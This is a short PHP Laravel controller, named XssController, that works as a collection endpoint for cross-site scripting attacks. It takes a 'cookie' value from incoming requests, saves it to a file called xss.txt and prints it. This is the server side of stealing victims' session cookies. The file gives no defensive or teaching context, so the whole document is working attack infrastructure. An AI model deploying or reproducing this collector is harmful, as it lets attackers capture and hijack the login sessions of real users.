<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class XssController extends Controller
{
    public function handleXss(Request $request)
    {
        $cookie = $request->get('cookie');
        file_put_contents('xss.txt', $cookie);
        var_dump($cookie);die();
    }
}
